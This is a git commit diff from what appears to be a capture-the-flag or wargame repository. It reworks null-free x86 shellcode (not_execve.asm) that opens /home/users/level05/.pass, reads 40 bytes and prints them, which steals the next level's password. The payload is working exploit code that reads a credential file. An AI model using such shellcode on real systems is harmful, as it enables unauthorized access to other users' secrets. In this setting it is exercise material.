e3e69a8c8b720efd0a04d71d94fa84a6103df24d
mli42 <mli@student.42.fr>
2022-06-07 16:43:39 +0200

    asm++

--- level04/Ressources/not_execve.asm
+++ level04/Ressources/not_execve.asm
@@ -3,10 +3,15 @@ global _start
 section .text
 
 _start:
+  call _true_start
+  db `/home/users/level05/.pass`, 0x0
+
+_true_start:
+  pop ebx
   sub esp, 0x40
   xor edx, edx
   xor ecx, ecx
-  lea ebx, [rel pathname]
+  ; lea ebx, [rel pathname] ; not working in x86?
 
   ; call open(".../level05/.pass", O_RDONLY)
   ; mov eax, 0x5 is ok too
@@ -17,17 +22,26 @@ _start:
   ; read(fd, &stack, 40)
   mov ebx, eax
   mov ecx, esp
-  mov edx, 0x28
+
+  xor edx, edx
+  mov dl, 0x28
+
   xor eax, eax
   mov al, 0x03
   int  0x80
 
   ; write(1, &stack, 40)
-  mov ebx, 0x01
+  xor ebx, ebx
+  mov bl, 0x01
+
   mov ecx, esp
-  mov edx, 0x28
+
+  xor edx, edx
+  mov dl, 0x28
+
   xor eax, eax
   mov al, 0x04
+
   int  0x80
 
-  pathname db `/home/users/level05/.pass`, 0x0
+  ;pathname db `/home/users/level05/.pass`, 0x0
